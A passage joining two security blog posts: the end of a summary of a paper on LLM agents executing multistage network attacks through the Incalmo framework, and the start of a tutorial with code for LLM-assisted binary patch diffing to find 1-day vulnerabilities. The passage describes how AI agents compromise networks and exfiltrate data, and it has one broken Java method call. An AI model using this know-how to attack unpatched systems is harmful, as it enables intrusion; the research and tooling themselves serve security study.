<p><strong>Iterative Execution Loop:</strong> Finally, the LLM enters an autonomous loop where it iteratively decides on a task to perform, Incalmo executes it, and the results are fed back for the LLM to analyze. For example, the LLM might output: <code>Action: scan_network(target=10.0.0.0/16)</code>. Incalmo’s action planner takes that and runs the appropriate <code>nmap</code> commands under the hood. The output (say, a list of discovered hosts and open ports) is then returned to the LLM (likely in a summarized form via the state service). The LLM reads the results and then decides the next high-level action. This cycle continues until the LLM believes it has achieved the goal or exhausts a time/step limit.</p>
</li>
</ol>
<p>By structuring the interaction in this manner, Incalmo essentially plays the role of an expert red-team operator executing the LLM’s ideas correctly and keeping it on track. It is worth noting that Incalmo is LLM-agnostic – it acts as a universal interface that could work with any language model, by providing the same high-level “attack API.” It does not modify the LLM’s internals; it only changes the prompts and the execution medium.</p>
<hr />
<h2>Case Study: LLM + Incalmo in Action</h2>
<p>To illustrate how an LLM attacks a network using Incalmo, the paper walks through a case study in the <strong>Equifax-inspired</strong> environment using the <strong>Sonnet 3.5</strong> model. This example highlights how the LLM, empowered by Incalmo, can carry out a full multistage attack that it could not achieve alone. The high-level steps include reconnaissance, initial exploitation, credential gathering, lateral movement, and data exfiltration:</p>
<ul>
<li>
<p><strong>External Reconnaissance:</strong> The LLM begins by scanning the target network. It issues a high-level “scan network” task via Incalmo, instructing the attack on the external IP range. Incalmo translates this into the appropriate <code>nmap</code> commands. The scan discovers two external hosts (for example, a web server and perhaps a mail server) accessible to the attacker. This information (host IPs and open ports) is added to the environment state and shared with the LLM.</p>
</li>
<li>
<p><strong>Initial Compromise:</strong> The LLM identifies the external web server as a likely entry point. It uses an “infect host” action on that server (i.e., attempt to exploit it). Incalmo’s action planner knows, from the scenario’s toolkit, which exploit to try (the Equifax scenario is designed to match a vulnerability chain described in public analyses). It executes the exploit and succeeds in gaining access to the web server (now a foothold inside the network). The environment state service updates the knowledge base: the attacker now has a shell on Host X.</p>
</li>
<li>
<p><strong>Post-Exploitation &amp; Credential Harvesting:</strong> With a presence on the web server, the LLM wants to expand its access. It issues a “find information on host” task for the compromised server – essentially a search for useful data like credentials, config files, etc. Incalmo carries this out (running a script to enumerate key directories, password files, etc.). This yields a valuable find: SSH credentials are discovered on the web server (perhaps an admin left keys or passwords on it). These credentials are reported back to the LLM via the state service.</p>
</li>
<li>
<p><strong>Lateral Movement:</strong> Now armed with valid SSH credentials, the LLM can pivot deeper. It chooses a “lateral movement: infect another host” task, targeting one of the internal database servers (the end goal is to reach databases). Incalmo uses the credentials to SSH into a database host and then runs an exploit or privilege escalation if needed. The LLM successfully compromises a database server with this step. It then again uses the “find information” task on the newly infected database host, which finds the stored critical data (e.g., customer records) on that machine.</p>
</li>
<li>
<p><strong>Exfiltration:</strong> Having found sensitive data, the LLM invokes the “exfiltrate data” action on the database host. Incalmo handles the mechanics (perhaps compressing and exfiltrating the data to the attacker’s machine or a drop server). The result is that the LLM obtains a chunk of the target data – for instance, one database dump file is retrieved successfully. At this point, the LLM has achieved part of the goal (data from one database). In the paper’s example, this constituted <strong>1 out of 48 files</strong> (since the Equifax environment had 48 databases with critical data).</p>
</li>
<li>
<p><strong>Scaling to Full Compromise:</strong> Crucially, the LLM doesn’t stop at one file. Noticing there are more target databases, it iteratively repeats the lateral movement and exfiltration process for each remaining database server. It systematically uses the credentials or footholds obtained to move through the network, infect all 48 database hosts, locate each critical file, and exfiltrate all of them. In effect, the LLM orchestrates a complete attack graph traversal: from initial access to total data breach across dozens of hosts. Incalmo executes each step reliably, and the attack graph service could be consulted if the LLM needed to ensure it covers all goal states.</p>
</li>
</ul>
<p>By the end of this loop, Sonnet 3.5 with Incalmo has fully compromised the Equifax-like network, achieving all attack goals. This is a striking result given that the same model without Incalmo couldn’t get beyond early reconnaissance. The case study demonstrates how the combination of LLM reasoning + Incalmo’s guidance and tools yields an autonomous agent capable of multi-host operations. Notably, the LLM was even able to handle the scale (iterating 48 times) – something that often tripped up attacks without Incalmo, where agents would stop after one success (a lack of persistence). With the structured approach, the LLM remained focused until the entire attack graph was cleared.</p>
<p>It’s worth mentioning that in this example the LLM sometimes assumed the next step – it could have alternatively queried the attack graph service to double-check prerequisites. Incalmo doesn’t force the LLM’s every decision; it provides guardrails and executes requests. The LLM still drives the overall strategy, but now with a much higher success rate for each step.</p>
<hr />
<h2>Results: Incalmo Unlocks Successful Autonomous Attacks</h2>
<p>Does Incalmo actually enable LLMs to succeed broadly? The evaluation results show a resounding yes. With Incalmo in the loop, the LLMs achieved capabilities that were previously out of reach:</p>
<ul>
<li>
<p><strong>Dramatic improvement in success rate:</strong> Using Incalmo, the LLM agents managed to <strong>partially succeed in 9 out of 10 environments</strong>, and <strong>fully succeed in 5 out of 10</strong> (in at least one trial). Recall that without Incalmo, <strong>0</strong> environments saw a full success and only <strong>1</strong> saw even a partial success. The high-level takeaway: Incalmo transformed multistage attack execution from “nearly impossible” to feasible in most cases.</p>
</li>
<li>
<p><strong>Model-agnostic benefits:</strong> The performance boost applied across different LLMs, not just the largest ones. In fact, a striking finding was that a smaller LLM with Incalmo could outperform a much larger LLM without Incalmo. For example, in the 4-Layer Chain environment, the relatively smaller Haiku 3.5 model using Incalmo was able to exfiltrate all 25 files (complete success), whereas the more powerful Sonnet 3.5 without Incalmo only managed to grab 1 file (partial success). This flips the conventional wisdom that a bigger model is always better – here the quality of guidance/abstraction mattered more than brute-force model capability. In other words, high-level task abstraction was a bigger factor for success than the underlying model size.</p>
</li>
<li>
<p><strong>Key role of the Action Planner:</strong> The ablation studies demonstrated that Incalmo’s most critical component is the action planner (high-level tasks). When the authors created a variant called <strong>Incalmo-WAP (Without Action Planner)</strong> – meaning the LLM had to issue low-level commands again, though still with the help of the state/graph services – the performance collapsed. LLMs with Incalmo-WAP failed to partially complete any goals in any of the 10 environments. This finding (“Finding 2.A”) confirms that the action planner’s abstract tasks are indispensable – they handle complexity that LLMs are otherwise bad at, enabling the whole attack to proceed.</p>
</li>
<li>
<p><strong>Impact of the auxiliary services:</strong> Incalmo’s other two components – the attack graph and environment state services – also provided measurable (though more modest) improvements. In an ablation variant <strong>Incalmo-WS (Without Services)</strong>, the LLM had the action planner but could not query the services directly (though the planner itself still used them internally for environment-agnostic execution). LLMs with Incalmo-WS did have some success, showing the action planner alone is a huge help. However, the full Incalmo (with services accessible to the LLM) enabled partial or full success in <strong>1–5 additional environments</strong> compared to Incalmo-WS, depending on the model. “Finding 2.B” quantifies this: across all LLMs tested, using the environment/attack-graph services allowed the agents to succeed in up to five more scenarios than they could without those services.</p>
</li>
<li>
<p><strong>Consistency and reliability:</strong> Another aspect examined was how reliable the success was across multiple trials. With stochastic LLM outputs, an agent might succeed in one run and fail in another. The paper notes that partial success became quite reliable in several cases – e.g., Haiku 3.5 and Sonnet 3.5 (with Incalmo) achieved partial success in all 5 trials in 5 out of 10 environments. Full success was still less consistent (only one model-environment pair achieved 100% full success rate in trials: Haiku 3.5 in the Colonial Pipeline scenario, with another model getting 4/5 in Equifax). This suggests that while Incalmo greatly improves average capability, there remains some variability (likely due to the LLM sometimes deviating or stopping early). Still, the worst-case outcome with Incalmo was often at least a partial compromise, which is far better than the across-the-board failures without it.</p>
</li>
</ul>
<p>In summary, Incalmo proved effective at enabling autonomous LLM-driven attacks. Out of the original 10 scenarios, only one remained unsolved (even partially) with Incalmo – highlighting a near-complete coverage of complex attack types that were previously impossible for the LLMs. The ablation experiments reinforced why it worked: the high-level action abstraction was critical, and the structured guidance from services provided the extra edge to maximize success. These quantitative results validate the paper’s thesis that the right interface (abstractions + information) can unlock emergent capabilities in LLMs, even more so than increasing model size.</p>
<hr />
<h2>Implications for Red-Teaming and Future Directions</h2>
<p>The findings of this research have significant implications for the security community, especially in the realms of automated red-teaming and adversary emulation. If LLMs can be guided to reliably carry out multistage attacks, they could serve as force-multipliers for security testing. Organizations could potentially deploy autonomous “Attacker LLMs” to continuously probe their networks, uncover misconfigurations, and validate defense against complex attack chains – a task traditionally requiring skilled (and expensive) human red teams. The paper’s conclusion emphasizes that fully autonomous multistage attackers can enable defenders to cheaply evaluate their security posture by running frequent, thorough tests. Incalmo demonstrates one way to realize such autonomous red team agents by giving the LLM both knowledge (attack graph context) and capability (attack tools via tasks).</p>
<p>At the same time, the authors acknowledge this prospect raises safety and ethical considerations. An agent that can penetrate networks autonomously is a double-edged sword – it could help defenders find weaknesses, but it might be misused by malicious actors. In response, the research team limited Incalmo’s built-in capabilities (only five exploits were included, covering common CVEs) to reduce potential harm. They also plan responsible disclosure: notifying major LLM providers so they can implement guardrails, and releasing Incalmo and the test environments as open-source tools for research. These steps aim to ensure that the technology is used for strengthening defenses, not aiding offense. It’s a reminder that alignment and control remain crucial as we develop AI agents with offensive skills.</p>
<h3>Future Work – Incorporating Defenders</h3>
<p>A notable limitation of the current study is that the attack environments did not include active network defenses or responsive blue-team behaviors. Real networks have intrusion detection systems, firewalls, or admins watching for threats. An important next step is to evaluate how an LLM attacker would fare against an active defender – and how it might need to adapt. The authors suggest extending Incalmo to scenarios with realistic (possibly autonomous) defenders in place. This could involve teaching the LLM to evade detection (e.g., limit noisy scans, rotate tactics if an approach is blocked) or even incorporating a game-theoretic planner that accounts for likely defensive responses. Introducing a defender would also test the LLM’s ability to strategize under pressure and modify its plan, which is a much higher bar than a static environment.</p>
<h3>Enhancing Attack Graph Reasoning</h3>
<p>While the attack graph service helped keep the LLM on track, the researchers observed that LLMs did not fully utilize it in some cases. For example, several partial successes with Incalmo were due to the LLM stopping after achieving one goal (say, exfiltrating one file) even though other goals remained. Ideally, the LLM should query the attack graph or state to realize there are more targets and continue the attack. This suggests room for improvement in how the LLM reasons about the attack graph and remaining objectives. Future enhancements might involve a more explicit planning algorithm that works alongside the LLM: e.g., an external planner that monitors which goal states are still unmet and prompts the LLM to pursue them (a form of self-reflection grounded in the attack graph). Another idea is giving the LLM more training on interpreting attack graphs or outputting a plan covering all goals before execution. The general aim is to make the agent more persistent and exhaustive – qualities needed for full network compromise. The authors hypothesize that better integration of the attack graph guidance would push partial successes to full successes more consistently.</p>
<h3>Broader Applications</h3>
<p>While this work focused on attack execution, similar principles could apply to other security domains where LLMs show promise. For instance, defenses could use LLMs to summarize security logs or find anomalies, but structured tools might enhance their accuracy. On offense, LLMs have been explored for tasks like phishing or social engineering content generation, and one can imagine frameworks analogous to Incalmo that guide LLMs in those areas (ensuring, for example, that a generated phishing campaign follows a realistic multi-step playbook). Moreover, the concept of high-level interfaces for LLM agents is not limited to security – it resonates with a growing trend in AI of using tool-based agent frameworks where LLMs delegate subtasks to tools or APIs. Incalmo serves as a case study of how powerful this approach can be: by giving an LLM the right tools and structure, we see a qualitative leap in its problem-solving ability.</p>
<hr />
<h2>Conclusion</h2>
<p><em>“On the Feasibility of Using LLMs to Execute Multistage Network Attacks”</em> ultimately delivers a cautiously optimistic message. Out-of-the-box, today’s LLMs are not ready to be master hackers – they flounder on long, complex tasks. But with carefully designed scaffolding like Incalmo, they can autonomously perform sophisticated attack campaigns that were previously only the domain of skilled humans. This opens the door to automated red-teaming agents that operate continuously and help harden systems. The research also serves as a blueprint for combining formal security knowledge (attack graphs, attack libraries) with LLM intelligence to achieve goals neither could alone. For security researchers and practitioners, it’s a compelling demonstration of how AI might transform offensive security – and a reminder that we must prepare defenses accordingly. The next steps will be refining these AI attackers, pitting them against AI defenders, and ensuring that as we unleash autonomous red-team bots, we do so responsibly and for the benefit of security overall.</p>
<hr />
<h2>References</h2>
<ol>
<li>Brian Singer, Keane Lucas, Lakshmi Adiga, Meghna Jain, Lujo Bauer, Vyas Sekar. <em>On the Feasibility of Using LLMs to Execute Multistage Network Attacks.</em> arXiv:2501.16466v2, 2025.  </li>
<li>arXiv: https://arxiv.org/abs/2501.16466  </li>
<li>
<p>PDF: https://arxiv.org/pdf/2501.16466.pdf</p>
</li>
<li>
<p>PentestGPT (baseline referenced by the paper):  </p>
</li>
<li>
<p>GitHub: https://github.com/GreyDGL/PentestGPT</p>
</li>
<li>
<p>MITRE ATT&amp;CK (high-level task inspiration context):  </p>
</li>
<li>
<p>https://attack.mitre.org/</p>
</li>
<li>
<p>MITRE Caldera (referenced in the paper as related tooling / substrate):  </p>
</li>
<li>
<p>https://caldera.mitre.org/</p>
</li>
<li>
<p>HTML (ar5iv): <a href="https://ar5iv.labs.arxiv.org/html/2501.16466v4#:~:text=These%20abstractions%20enable%20Incalmo%C2%A0%20to,Incalmo%C2%A0in%20an%20iterative%20execution%20loop" target="_blank" rel="noreferrer">ar5iv.labs.arxiv.org/html/2501.16466v4</a></p>
</li>
</ol>
`,bg=`<h1>LLM-Assisted Binary Diffing: Finding 1-Days Before PoCs Drop</h1>
<p><strong>TL;DR</strong> — When a vendor ships a security patch, the binary itself tells the full story. Researchers have always diffed patched vs. unpatched binaries to reverse-engineer vulnerabilities. LLMs now compress that process from days to hours. This post walks through a complete technical pipeline: acquiring binaries, structuring diffs for LLM consumption, prompt engineering for vulnerability classification, and validating the output — with working code at every stage.</p>
<hr />
<h2>The 1-Day Window</h2>
<p>Every Patch Tuesday, Microsoft publishes security updates with deliberately vague descriptions: <em>&quot;Remote Code Execution vulnerability in Windows Kernel.&quot;</em> No technical details. No PoC. Just a CVE number, a severity rating, and a patched binary.</p>
<p>But here&#x27;s the thing — the patch itself <em>is</em> the vulnerability disclosure. The diff between the patched and unpatched binary reveals exactly what was broken: which function, which check was missing, which boundary wasn&#x27;t validated. For years, skilled reverse engineers have exploited this asymmetry. They diff the binaries, find the vuln, build the exploit, and use it against the enormous population of systems that haven&#x27;t patched yet.</p>
<p>That window between patch release and widespread deployment is the 1-day window. It&#x27;s always been valuable. LLMs are about to make it <em>dangerous</em>.</p>
<hr />
<h2>Why LLMs Change the Equation</h2>
<p>Traditional patch diffing requires a reverse engineer who can:</p>
<ol>
<li>Navigate thousands of changed functions to find the security-relevant ones</li>
<li>Read decompiled C pseudocode fluently</li>
<li>Recognize vulnerability patterns (off-by-one, integer overflow, UAF, type confusion)</li>
<li>Reason about exploitability — can an attacker reach this code? What primitives does it give?</li>
</ol>
<p>This is a rare skillset. Maybe a few hundred people worldwide can do it quickly and reliably. LLMs don&#x27;t replace them, but they act as a <em>force multiplier</em> that makes the initial triage phase almost instant.</p>
<p>Why this works now:</p>
<ul>
<li><strong>Decompiler output is basically C</strong> — Ghidra and IDA produce pseudocode that looks like C. LLMs are trained on enormous amounts of C. They can reason about it.</li>
<li><strong>Context windows are large enough</strong> — You can feed entire function pairs (before/after) with caller context. A year ago, you&#x27;d be truncating critical code.</li>
<li><strong>Vulnerability patterns are well-documented</strong> — The model has seen thousands of CVE descriptions, write-ups, and exploit analyses during training. It knows what an integer overflow looks like.</li>
</ul>
<p>The result: tasks that took an experienced researcher 4-8 hours of focused work can now be triaged in minutes. The human still validates, but the LLM does the heavy lifting of pattern recognition.</p>
<hr />
<h2>The Pipeline Architecture</h2>
<p>Here&#x27;s what we&#x27;re building end-to-end:</p>
<pre><code>
┌──────────────┐     ┌──────────────┐     ┌──────────────────┐
│  Patch drops  │────▶│ Extract bins │────▶│  BinDiff/Diaphora│
│  (Patch Tue)  │     │  (pre/post)  │     │  (function diff)  │
└──────────────┘     └──────────────┘     └────────┬─────────┘
                                                    │
                     ┌──────────────┐     ┌────────▼─────────┐
                     │  Structured   │◀────│ Headless Ghidra   │
                     │  LLM Prompt   │     │ (decompile both)  │
                     └───────┬──────┘     └──────────────────┘
                             │
                    ┌────────▼─────────┐
                    │   LLM Analysis   │
                    │  (multi-round)   │
                    └────────┬─────────┘
                             │
                    ┌────────▼─────────┐
                    │   Validation +   │
                    │   Scoring        │
                    └──────────────────┘
</code></pre>
<p>Each stage has real engineering decisions. Let&#x27;s walk through every one.</p>
<hr />
<h2>Stage 1: Acquiring the Binaries</h2>
<p>This sounds trivial. It isn&#x27;t. Half the battle is reliably getting the exact pre-patch and post-patch versions of the right binary.</p>
<h3>Windows (Patch Tuesday)</h3>
<p><strong>Winbindex</strong> is the gold standard. It indexes every version of every Windows system DLL and driver ever shipped, keyed by KB number. You can pull the exact binary pair you need.</p>
<pre><code class="language-python">
import requests
import json
import subprocess
import os
from pathlib import Path

class BinaryAcquirer:
    &quot;&quot;&quot;
    Acquires pre-patch and post-patch Windows binaries 
    using Winbindex for a given KB update.
    &quot;&quot;&quot;
    
    WINBINDEX_API = &quot;https://winbindex.m417z.com/data/by_filename_compressed&quot;
    SYMBOL_SERVER = &quot;https://msdl.microsoft.com/download/symbols&quot;
    
    def __init__(self, output_dir=&quot;./binaries&quot;):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def get_file_versions(self, filename):
        &quot;&quot;&quot;
        Query Winbindex for all known versions of a Windows binary.
        Returns a dict mapping version strings to download metadata.
        &quot;&quot;&quot;
        url = f&quot;{self.WINBINDEX_API}/{filename}.json.gz&quot;
        resp = requests.get(url)
        resp.raise_for_status()
        return resp.json()
    
    def find_patch_pair(self, filename, kb_number):
        &quot;&quot;&quot;
        Given a filename (e.g., &#x27;ntoskrnl.exe&#x27;) and KB number,
        find the versions immediately before and after the patch.
        
        Returns (pre_patch_info, post_patch_info) or raises if not found.
        &quot;&quot;&quot;
        versions = self.get_file_versions(filename)
        
        # Filter versions, sort by timestamp
        sorted_versions = sorted(
            versions.items(),
            key=lambda x: x[1].get(&quot;timestamp&quot;, 0)
        )
        
        post_patch = None
        pre_patch = None
        
        for version_str, info in sorted_versions:
            if kb_number.upper() in json.dumps(info).upper():
                post_patch = (version_str, info)
                break
        
        if not post_patch:
            raise ValueError(f&quot;KB {kb_number} not found for {filename}&quot;)
        
        # The version immediately before in the sorted list is our pre-patch
        post_idx = [v[0] for v in sorted_versions].index(post_patch[0])
        if post_idx &gt; 0:
            pre_patch = sorted_versions[post_idx - 1]
        
        return pre_patch, post_patch
    
    def download_binary(self, file_info, output_name):
        &quot;&quot;&quot;
        Download a specific binary version from Microsoft&#x27;s symbol server
        or directly from the update package.
        &quot;&quot;&quot;
        output_path = self.output_dir / output_name
        
        if &quot;fileInfo&quot; in file_info:
            # Use PE hash to download from symbol server
            fi = file_info[&quot;fileInfo&quot;]
            timestamp = format(fi[&quot;timestamp&quot;], &quot;X&quot;)
            size = format(fi[&quot;virtualSize&quot;], &quot;X&quot;)
            url = f&quot;{self.SYMBOL_SERVER}/{output_name}/{timestamp}{size}/{output_name}&quot;
            
            resp = requests.get(url, stream=True)
            resp.raise_for_status()
            
            with open(output_path, &quot;wb&quot;) as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    f.write(chunk)
        
        print(f&quot;[+] Downloaded: {output_path} ({output_path.stat().st_size} bytes)&quot;)
        return output_path


# --- Alternative: Extract from .msu update packages directly ---

def extract_from_msu(msu_path, target_filename, output_dir):
    &quot;&quot;&quot;
    Extract a specific file from a Windows Update .msu package.
    
    MSU structure:
      .msu -&gt; contains .cab files
        .cab -&gt; contains actual binaries (sometimes nested)
    &quot;&quot;&quot;
    work_dir = Path(output_dir) / &quot;msu_work&quot;
    work_dir.mkdir(parents=True, exist_ok=True)
    
    # Step 1: Extract the .msu (it&#x27;s a cabinet archive)
    subprocess.run(
        [&quot;expand&quot;, &quot;-F:*&quot;, str(msu_path), str(work_dir)],
        check=True, capture_output=True
    )
    
    # Step 2: Find and extract the inner .cab
    for cab in work_dir.glob(&quot;*.cab&quot;):
        subprocess.run(
            [&quot;expand&quot;, &quot;-F:*&quot;, str(cab), str(work_dir / &quot;inner&quot;)],
            check=True, capture_output=True
        )
    
    # Step 3: Locate the target binary
    results = list((work_dir / &quot;inner&quot;).rglob(target_filename))
    if not results:
        raise FileNotFoundError(
            f&quot;{target_filename} not found in {msu_path}&quot;
        )
    
    return results[0]
</code></pre>
<h3>Linux Kernel</h3>
<p>For Linux, you have it easier — the source is public. But binary-level analysis on compiled kernel modules is still interesting because <strong>compiler optimizations obscure the vulnerability</strong>. The source diff might show a simple bounds check, but the compiled code might have been vectorized, inlined, or reordered.</p>
<pre><code class="language-bash">
# Get the exact commit that patched a CVE
git log --all --grep=&quot;CVE-2024-XXXXX&quot; --format=&quot;%H %s&quot;

# Get the parent (pre-patch) commit
git rev-parse &lt;patch_commit&gt;^

# Build both versions of the specific module
git checkout &lt;pre_patch_commit&gt;
make M=drivers/target_subsystem/
cp drivers/target_subsystem/target.ko ./target_pre.ko

git checkout &lt;post_patch_commit&gt;
make M=drivers/target_subsystem/
cp drivers/target_subsystem/target.ko ./target_post.ko
</code></pre>
<hr />
<h2>Stage 2: Diffing — BinDiff vs Diaphora</h2>
<p>Both tools match functions between two binaries and assign similarity scores. The interesting functions are the ones with similarity between 0.5 and 0.99 — similar enough to be the same function, but different enough that something changed.</p>
<h3>Why Diaphora Wins for This Pipeline</h3>
<p>Diaphora exports results to <strong>SQLite</strong>, which makes programmatic access trivial. BinDiff uses a custom binary format that&#x27;s painful to parse.</p>
<pre><code class="language-python">
import sqlite3
from dataclasses import dataclass
from typing import List, Optional

@dataclass
class FunctionDiff:
    &quot;&quot;&quot;Represents a single changed function between two binary versions.&quot;&quot;&quot;
    name: str
    address_original: int
    address_patched: int
    similarity_ratio: float
    pseudocode_original: Optional[str] = None
    pseudocode_patched: Optional[str] = None
    callers: Optional[List[str]] = None
    
    @property
    def is_security_relevant(self):
        &quot;&quot;&quot;
        Heuristic: functions with similarity 0.7-0.99 are most likely
        to be security patches. Below 0.7 might be refactors.
        Above 0.99 is probably just metadata/version changes.
        &quot;&quot;&quot;
        return 0.7 &lt;= self.similarity_ratio &lt;= 0.99


class DiaphoraAnalyzer:
    &quot;&quot;&quot;
    Extracts and ranks changed functions from Diaphora&#x27;s SQLite output.
    Focuses on identifying security-relevant patches.
    &quot;&quot;&quot;
    
    def __init__(self, db_path):
        self.db = sqlite3.connect(db_path)
        self.db.row_factory = sqlite3.Row
    
    def get_changed_functions(self, min_ratio=0.5, max_ratio=0.99):
        &quot;&quot;&quot;
        Extract functions that changed between versions.
        
        Sorted by ratio ASC — most changed first — because 
        the biggest changes are often the most interesting patches.
        
        Filters out:
        - Perfect matches (ratio = 1.0) — unchanged
        - Very low matches (ratio &lt; 0.5) — likely refactors, not patches
        &quot;&quot;&quot;
        cursor = self.db.execute(&quot;&quot;&quot;
            SELECT 
                name,
                address,
                address2,
                ratio,
                pseudocode,
                pseudocode2,
                md_index          -- Complexity metric
            FROM results 
            WHERE ratio &lt; ? 
              AND ratio &gt; ?
              AND name NOT LIKE &#x27;%guard%&#x27;     -- Filter out CFG stubs
              AND name NOT LIKE &#x27;%security_cookie%&#x27;
            ORDER BY ratio ASC
        &quot;&quot;&quot;, (max_ratio, min_ratio))
        
        functions = []
        for row in cursor:
            diff = FunctionDiff(
                name=row[&quot;name&quot;],
                address_original=row[&quot;address&quot;],
                address_patched=row[&quot;address2&quot;],
                similarity_ratio=row[&quot;ratio&quot;],
                pseudocode_original=row[&quot;pseudocode&quot;],
                pseudocode_patched=row[&quot;pseudocode2&quot;]
            )
            functions.append(diff)
        
        return functions
    
    def get_security_candidates(self):
        &quot;&quot;&quot;
        Returns functions most likely to be security patches.
        Uses multiple heuristics beyond just similarity ratio.
        &quot;&quot;&quot;
        all_changed = self.get_changed_functions()
        
        candidates = []
        for func in all_changed:
            score = self._security_score(func)
            if score &gt; 0.5:
                candidates.append((score, func))
        
        # Sort by security relevance score, descending
        candidates.sort(key=lambda x: x[0], reverse=True)
        return candidates
    
    def _security_score(self, func: FunctionDiff) -&gt; float:
        &quot;&quot;&quot;
        Heuristic scoring for how likely a function change is 
        a security patch vs. a feature change or refactor.
        &quot;&quot;&quot;
        score = 0.0
        
        # Similarity ratio sweet spot
        if 0.85 &lt;= func.similarity_ratio &lt;= 0.98:
            score += 0.4  # Small, targeted change = likely a fix
        
        if func.pseudocode_patched and func.pseudocode_original:
            patched = func.pseudocode_patched.lower()
            original = func.pseudocode_original.lower()
            
            # New bounds checks added
            new_checks = [
                &quot;if (&quot;, &quot;&lt; 0&quot;, &quot;&gt; 0&quot;, &quot;&lt;= 0&quot;, &quot;&gt;= 0&quot;,
                &quot;!= null&quot;, &quot;== null&quot;, &quot;!= 0&quot;,
                &quot;size&quot;, &quot;length&quot;, &quot;count&quot;, &quot;bound&quot;
            ]
            for check in new_checks:
                if check in patched and check not in original:
                    score += 0.3
                    break
            
            # New error handling
            if &quot;return&quot; in patched and patched.count(&quot;return&quot;) &gt; original.count(&quot;return&quot;):
                score += 0.2
            
            # Lock/synchronization added (race condition fix)
            sync_keywords = [&quot;lock&quot;, &quot;mutex&quot;, &quot;spinlock&quot;, &quot;critical_section&quot;]
            for kw in sync_keywords:
                if kw in patched and kw not in original:
                    score += 0.4
                    break
        
        # Function name hints
        security_names = [
            &quot;validate&quot;, &quot;check&quot;, &quot;verify&quot;, &quot;sanitize&quot;,
            &quot;parse&quot;, &quot;decode&quot;, &quot;deserialize&quot;, &quot;callback&quot;,
            &quot;alloc&quot;, &quot;free&quot;, &quot;release&quot;, &quot;dispatch&quot;
        ]
        name_lower = func.name.lower()
        for hint in security_names:
            if hint in name_lower:
                score += 0.1
                break
        
        return min(score, 1.0)
    
    def close(self):
        self.db.close()
</code></pre>
<h3>Running Diaphora</h3>
<pre><code class="language-bash">
# In IDA Pro (or use the Ghidra port):
# 1. Open the ORIGINAL binary
# 2. Run diaphora.py → export to original.sqlite

# 3. Open the PATCHED binary  
# 4. Run diaphora.py → diff against original.sqlite
# 5. Results saved to diaphora_results.sqlite
</code></pre>
<hr />
<h2>Stage 3: Headless Decompilation at Scale</h2>
<p>You need decompiled pseudocode for both versions of every changed function. Doing this manually is insane. Ghidra&#x27;s headless mode is the answer.</p>
<pre><code class="language-python">
import subprocess
import json
from pathlib import Path
from typing import Dict

class HeadlessGhidra:
    &quot;&quot;&quot;
    Drives Ghidra in headless mode to decompile specific functions
    from a binary. Only decompiles functions flagged by Diaphora
    to avoid wasting time on unchanged code.
    &quot;&quot;&quot;
    
    GHIDRA_HOME = &quot;/opt/ghidra&quot;  # Adjust to your installation
    
    def __init__(self, project_dir=&quot;./ghidra_projects&quot;):
        self.project_dir = Path(project_dir)
        self.project_dir.mkdir(parents=True, exist_ok=True)
    
    def decompile_functions(
        self, 
        binary_path: str, 
        function_addresses: list,
        project_name: str = &quot;diffproject&quot;
    ) -&gt; Dict[int, str]:
        &quot;&quot;&quot;
        Decompile specific functions from a binary using Ghidra headless.
        
        Args:
            binary_path: Path to the binary to analyze
            function_addresses: List of function addresses (int) to decompile
            project_name: Ghidra project name
            
        Returns:
            Dict mapping address -&gt; decompiled pseudocode string
        &quot;&quot;&quot;
        # Write target addresses to a file for the Ghidra script
        addr_file = self.project_dir / &quot;target_addrs.json&quot;
        addr_file.write_text(json.dumps(
            [hex(addr) for addr in function_addresses]
        ))
        
        output_file = self.project_dir / &quot;decompiled_output.json&quot;
        
        # Run Ghidra headless analyzer
        cmd = [
            f&quot;{self.GHIDRA_HOME}/support/analyzeHeadless&quot;,
            str(self.project_dir),
            project_name,
            &quot;-import&quot;, binary_path,
            &quot;-postScript&quot;, &quot;DecompileTargets.java&quot;,
            &quot;-scriptPath&quot;, str(Path(__file__).parent / &quot;ghidra_scripts&quot;),
            &quot;-overwrite&quot;,
            &quot;-deleteProject&quot;,  # Clean up after
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600  # 10 min timeout per binary
        )
        
        if result.returncode != 0:
            print(f&quot;[!] Ghidra stderr:\\n{result.stderr[-2000:]}&quot;)
            raise RuntimeError(&quot;Ghidra analysis failed&quot;)
        
        # Parse output
        if output_file.exists():
            return json.loads(output_file.read_text())
        
        return {}
</code></pre>
<p>And the corresponding Ghidra script (<code>DecompileTargets.java</code>):</p>
<pre><code class="language-java">
// DecompileTargets.java — Ghidra postScript
// Decompiles only the functions at addresses specified in target_addrs.json
// Outputs results to decompiled_output.json

import ghidra.app.decompiler.DecompInterface;
import ghidra.app.decompiler.DecompileResults;
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.Function;
import ghidra.program.model.listing.FunctionManager;
import ghidra.program.model.address.Address;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.*;
import java.util.*;

public class DecompileTargets extends GhidraScript {
    
    @Override
    public void run() throws Exception {
        // Read target addresses
        File addrFile = new File(
            getProjectRootFolder().getProjectLocator()
                .getProjectDir().getParent(),
            &quot;target_addrs.json&quot;
        );
        
        Gson gson = new Gson();
        List&lt;String&gt; targetAddrs = gson.fromJson(
            new FileReader(addrFile),
            new TypeToken&lt;List&lt;String&gt;&gt;(){}.getType()
        );
        
        // Set up decompiler
        DecompInterface decomp = new DecompInterface();
        decomp.openProgram(currentProgram);
        
        FunctionManager funcMgr = currentProgram.getFunctionManager();
        Map&lt;String, Object&gt; results = new HashMap&lt;&gt;();
        
        for (String addrStr : targetAddrs) {
            long addrLong = Long.parseLong(
                addrStr.replace(&quot;0x&quot;, &quot;&quot;), 16
            );
            Address addr = currentProgram.getAddressFactory()
                .getDefaultAddressSpace().getAddress(addrLong);
            Function func = funcMgr.getFunctionAt(addr);
            
            if (func == null) {
                // Try to find containing function
                func = funcMgr.getFunctionContaining(addr);
            }
            
            if (func != null) {
                DecompileResults res = decomp.decompileFunction(
                    func, 120, monitor  // 120 second timeout per function
                );
                
                if (res.depiledFunction() != null) {
                    Map&lt;String, String&gt; funcData = new HashMap&lt;&gt;();
                    funcData.put(&quot;name&quot;, func.getName());
                    funcData.put(&quot;pseudocode&quot;, 
                        res.getDecompiledFunction().getC());
                    funcData.put(&quot;signature&quot;, 
                        func.getSignature().getPrototypeString());
                    
                    // Get callers (cross-references)
                    List&lt;String&gt; callers = new ArrayList&lt;&gt;();
                    for (var ref : getReferencesTo(func.getEntryPoint())) {
